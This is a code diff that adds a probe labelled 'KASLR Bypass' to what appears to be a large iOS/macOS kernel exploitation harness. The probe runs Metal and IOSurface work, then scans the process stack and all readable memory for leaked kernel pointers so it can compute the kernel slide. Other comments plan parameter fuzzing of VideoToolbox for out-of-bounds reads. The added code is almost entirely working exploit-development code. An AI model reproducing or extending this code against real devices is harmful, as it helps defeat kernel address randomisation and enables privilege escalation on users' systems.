@@ -14472,6 +14472,272 @@ static void r350_probe(void) {
  *
  * Any kernel pointer found gives us: kslide = leaked_ptr - known_offset
  */
+/* r354: Deep stack scan across Metal passes — reproduce r352 stack leak */
+static void r354_probe(void) {
+    rlog("\n=== r354: Deep Stack Scan — Reproduce r352 Kernel VA Leak ===\n\n");
+    fflush(stdout);
+
+    #define IS_KPTR354(v) ( \
+        ((v) != 0) && ((v) != 0xFFFFFFFFFFFFFFFFULL) && \
+        ((v) != 0xFFFFFFFF00000000ULL) && ((v) != 0xFFFFFFFF00000001ULL) && \
+        ( ((v) & 0xFFFFF00000000000ULL) == 0xFFFFF00000000000ULL ) \
+    )
+
+    /* Known constants from shared cache — filter these out */
+    uint64_t known_const[] = {
+        0xfffffff007004000ULL, 0xfffffff007000000ULL,
+        0xfffffff027004000ULL, 0xfffffff037004000ULL,
+        0xfffffff047004000ULL, 0xfffffff017004000ULL,
+        0xfffffff00f004000ULL, 0xfffffff000000000ULL,
+        0xfffffff800000000ULL, 0xffffffc000000000ULL,
+        0xffffffe000000000ULL, 0xffffffe100000000ULL,
+        0xffffffe200000000ULL, 0xffffffe400000000ULL,
+        0xffffffffffffc000ULL, 0xffffffffffc00000ULL,
+        0xffffffffffffff00ULL, 0xffffffffff0400f7ULL,
+        0xfffffffffb440e00ULL, 0xfffffc820e008100ULL,
+        0
+    };
+
+    /* ---- Find our thread's stack VM region ---- */
+    rlog("--- Finding main thread stack VM region ---\n");
+    mach_vm_address_t stack_base = 0;
+    mach_vm_size_t stack_size = 0;
+    {
+        char dummy;
+        mach_vm_address_t sp_approx = (mach_vm_address_t)&dummy;
+        rlog("  Current SP approx: 0x%llx\n", (unsigned long long)sp_approx);
+
+        mach_vm_address_t addr = 0;
+        while (1) {
+            mach_vm_size_t sz = 0;
+            uint32_t depth = 1;
+            struct vm_region_submap_info_64 info;
+            mach_msg_type_number_t cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+            kern_return_t kr = mach_vm_region_recurse(mach_task_self(), &addr, &sz, &depth,
+                (vm_region_recurse_info_t)&info, &cnt);
+            if (kr != KERN_SUCCESS) break;
+            if (sp_approx >= addr && sp_approx < addr + sz) {
+                stack_base = addr;
+                stack_size = sz;
+                rlog("  Stack region: 0x%llx - 0x%llx (size=0x%llx = %llu KB)\n",
+                    (unsigned long long)addr, (unsigned long long)(addr + sz),
+                    (unsigned long long)sz, (unsigned long long)(sz / 1024));
+                rlog("  Protection: cur=%d max=%d tag=%d\n",
+                    info.protection, info.max_protection, info.user_tag);
+                break;
+            }
+            addr += sz;
+        }
+    }
+
+    if (!stack_base || !stack_size) {
+        rlog("  ERROR: Could not find stack region\n");
+        goto r354_done;
+    }
+
+    /* ---- Two-pass deep stack scan with Metal work between passes ---- */
+    #define R354_MAX_HITS 512
+    typedef struct { size_t offset; uint64_t val; } r354_hit_t;
+    r354_hit_t pass0_hits[R354_MAX_HITS];
+    r354_hit_t pass1_hits[R354_MAX_HITS];
+    int pass0_count = 0, pass1_count = 0;
+
+    for (int pass = 0; pass < 2; pass++) {
+        rlog("\n--- Pass %d: ", pass);
+
+        if (pass == 0) {
+            rlog("doing Metal/AGX work first ---\n");
+        } else {
+            rlog("doing DIFFERENT Metal/AGX work ---\n");
+        }
+        fflush(stdout);
+
+        /* Do Metal/AGX work to populate kernel residuals on stack */
+        {
+            id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
+            if (!dev) {
+                rlog("  No Metal device!\n");
+                goto r354_done;
+            }
+            id<MTLCommandQueue> q = [dev newCommandQueue];
+            /* Create shared buffers to exercise AGX mapping path */
+            id<MTLBuffer> buf1 = [dev newBufferWithLength:(pass == 0 ? 65536 : 131072)
+                                   options:MTLResourceStorageModeShared];
+            id<MTLBuffer> buf2 = [dev newBufferWithLength:(pass == 0 ? 32768 : 65536)
+                                   options:MTLResourceStorageModeShared];
+            /* Fill with pattern */
+            memset([buf1 contents], 0xAA + pass, [buf1 length]);
+            memset([buf2 contents], 0xBB + pass, [buf2 length]);
+
+            /* Submit blit commands to exercise kernel-side GPU path */
+            for (int i = 0; i < (pass == 0 ? 3 : 5); i++) {
+                id<MTLCommandBuffer> cb = [q commandBuffer];
+                id<MTLBlitCommandEncoder> enc = [cb blitCommandEncoder];
+                size_t copyLen = (pass == 0 ? 16384 : 32768);
+                if (copyLen > [buf1 length]) copyLen = [buf1 length];
+                if (copyLen > [buf2 length]) copyLen = [buf2 length];
+                [enc copyFromBuffer:buf1 sourceOffset:0
+                           toBuffer:buf2 destinationOffset:0 size:copyLen];
+                [enc endEncoding];
+                [cb commit];
+                [cb waitUntilCompleted];
+            }
+
+            /* Also do IOSurface operations to exercise that kernel path */
+            IOSurfaceRef surf = IOSurfaceCreate((__bridge CFDictionaryRef)@{
+                @"IOSurfaceWidth": @(64 + pass * 32),
+                @"IOSurfaceHeight": @(64 + pass * 32),
+                @"IOSurfaceBytesPerElement": @4,
+                @"IOSurfacePixelFormat": @(0x42475241)
+            });
+            if (surf) {
+                IOSurfaceLock(surf, 0, NULL);
+                memset(IOSurfaceGetBaseAddress(surf), 0xCC + pass, IOSurfaceGetAllocSize(surf));
+                IOSurfaceUnlock(surf, 0, NULL);
+                /* Look up surface to exercise kernel lookup path */
+                uint32_t sid = IOSurfaceGetID(surf);
+                IOSurfaceRef s2 = IOSurfaceLookup(sid);
+                if (s2) CFRelease(s2);
+                CFRelease(surf);
+            }
+
+            rlog("  Metal work done (buf sizes: %zu, %zu)\n",
+                (size_t)[buf1 length], (size_t)[buf2 length]);
+        }
+
+        /* Now scan the FULL stack region */
+        rlog("  Scanning stack region 0x%llx - 0x%llx...\n",
+            (unsigned long long)stack_base,
+            (unsigned long long)(stack_base + stack_size));
+        fflush(stdout);
+
+        r354_hit_t *hits = (pass == 0) ? pass0_hits : pass1_hits;
+        int *hit_count = (pass == 0) ? &pass0_count : &pass1_count;
+        *hit_count = 0;
+
+        volatile uint64_t *scan = (volatile uint64_t *)(uintptr_t)stack_base;
+        size_t nqwords = (size_t)stack_size / 8;
+        int is_known;
+
+        for (size_t i = 0; i < nqwords && *hit_count < R354_MAX_HITS; i++) {
+            uint64_t v = scan[i];
+            if (!IS_KPTR354(v)) continue;
+
+            /* Filter known constants */
+            is_known = 0;
+            for (int k = 0; known_const[k]; k++) {
+                if (v == known_const[k]) { is_known = 1; break; }
+            }
+            /* Filter small constants with 0xFFFFFFFF upper */
+            if (!is_known && (v & 0xFFFFFFFF00000000ULL) == 0xFFFFFFFF00000000ULL &&
+                (v & 0x00000000FFFFFFFFULL) < 0x10000)
+                is_known = 1;
+            /* Filter x16 Mach trap numbers */
+            if (!is_known && (v & 0xFFFFFFFFFFFFFF00ULL) == 0xFFFFFFFFFFFFFF00ULL)
+                is_known = 1;
+
+            if (!is_known) {
+                size_t off = i * 8;
+                hits[*hit_count].offset = off;
+                hits[*hit_count].val = v;
+                (*hit_count)++;
+            }
+        }
+        rlog("  Pass %d: %d kernel-range hits\n", pass, *hit_count);
+        for (int j = 0; j < *hit_count && j < 30; j++) {
+            rlog("    [%d] +0x%zx = 0x%llx\n", j, hits[j].offset,
+                (unsigned long long)hits[j].val);
+        }
+        if (*hit_count > 30) rlog("    ... (%d more)\n", *hit_count - 30);
+        fflush(stdout);
+    }
+
+    /* ---- Compare passes: find values that CHANGED (dynamic = kernel leak) ---- */
+    rlog("\n--- Cross-pass analysis ---\n");
+    rlog("  Pass 0: %d hits, Pass 1: %d hits\n", pass0_count, pass1_count);
+
+    int changed = 0, stable = 0, new_in_p1 = 0;
+    for (int i = 0; i < pass1_count; i++) {
+        int found_same_offset = 0;
+        for (int j = 0; j < pass0_count; j++) {
+            if (pass1_hits[i].offset == pass0_hits[j].offset) {
+                found_same_offset = 1;
+                if (pass1_hits[i].val != pass0_hits[j].val) {
+                    rlog("  *** CHANGED +0x%zx: 0x%llx -> 0x%llx ***\n",
+                        pass1_hits[i].offset,
+                        (unsigned long long)pass0_hits[j].val,
+                        (unsigned long long)pass1_hits[i].val);
+                    changed++;
+                } else {
+                    stable++;
+                }
+                break;
+            }
+        }
+        if (!found_same_offset) {
+            rlog("  NEW in pass1 +0x%zx = 0x%llx\n",
+                pass1_hits[i].offset, (unsigned long long)pass1_hits[i].val);
+            new_in_p1++;
+        }
+    }
+    rlog("  Summary: %d changed, %d stable, %d new-in-pass1\n",
+        changed, stable, new_in_p1);
+
+    /* ---- Also scan ALL VM regions (not just stack) for 0xFFFFFFFE prefix ---- */
+    rlog("\n--- Full VM scan for 0xFFFFFFFE-prefix values ---\n");
+    fflush(stdout);
+    {
+        mach_vm_address_t addr = 0;
+        int region_hits = 0;
+        while (1) {
+            mach_vm_size_t sz = 0;
+            uint32_t depth = 1;
+            struct vm_region_submap_info_64 info;
+            mach_msg_type_number_t cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+            kern_return_t kr = mach_vm_region_recurse(mach_task_self(), &addr, &sz, &depth,
+                (vm_region_recurse_info_t)&info, &cnt);
+            if (kr != KERN_SUCCESS) break;
+
+            /* Only scan readable regions, skip if too large (>8MB) */
+            if ((info.protection & VM_PROT_READ) && sz <= 8 * 1024 * 1024 && sz > 0) {
+                volatile uint64_t *p = (volatile uint64_t *)(uintptr_t)addr;
+                size_t nq = (size_t)sz / 8;
+                for (size_t i = 0; i < nq; i++) {
+                    uint64_t v = p[i];
+                    /* Specifically look for 0xFFFFFFFE prefix — the r352 finding */
+                    if ((v & 0xFFFFFFFF00000000ULL) == 0xFFFFFFFE00000000ULL) {
+                        int is_k = 0;
+                        for (int k = 0; known_const[k]; k++) {
+                            if (v == known_const[k]) { is_k = 1; break; }
+                        }
+                        if (!is_k) {
+                            rlog("  0xFFFFFFFE hit: region 0x%llx+0x%llx tag=%d  offset=+0x%zx val=0x%llx\n",
+                                (unsigned long long)addr, (unsigned long long)sz,
+                                info.user_tag, i * 8, (unsigned long long)v);
+                            region_hits++;
+                            if (region_hits >= 50) {
+                                rlog("  (capped at 50 hits)\n");
+                                goto r354_vm_done;
+                            }
+                        }
+                    }
+                }
+            }
+            addr += sz;
+        }
+    r354_vm_done:
+        rlog("  Total 0xFFFFFFFE-prefix hits across VM: %d\n", region_hits);
+    }
+
+    rlog("\n=== r354 complete ===\n");
+    fflush(stdout);
+
+r354_done:
+    #undef IS_KPTR354
+    #undef R354_MAX_HITS
+    (void)0;
+}
+
 /* r353 helpers */
 static int r353_is_known_constant(uint64_t v) {
     uint64_t known[] = {
@@ -50601,6 +50867,14 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 357) {
+            rlog("*** rounds=357: KASLR Bypass — Deep Stack Scan Across Metal Passes ***\n");
+            rlog("  r352 found 0xFFFFFFFEFBxxxxxx at stack+466800, changed between passes.\n");
+            rlog("  r354: scan FULL stack VM region in 2 passes + full VM 0xFFFFFFFE scan.\n\n");
+            fflush(stdout);
+            r354_probe();
+            goto done;
+        }
         if (rounds == 356) {
             rlog("*** rounds=356: KASLR Bypass — Targeted Stack/Register/KTRR Scan ***\n");
             rlog("  r352: Stack value 0xFFFFFFFEFBxxxxxx changed between AGX passes.\n");
@@ -52661,7 +52935,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
@@ -62503,7 +62777,7 @@ new_modes:
          *   - Create VideoToolbox session, fuzz parameters for OOB read
          *   - Look for kernel pointer leaks in output buffers
          */
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357) {
             rlog("\n--- Phase 17: IOSurface shared memory + KASLR probe ---\n");
             if ((rounds >= 220 && rounds <= 224) || rounds == 226 || rounds == 227 || rounds == 228) goto r220_block;
 
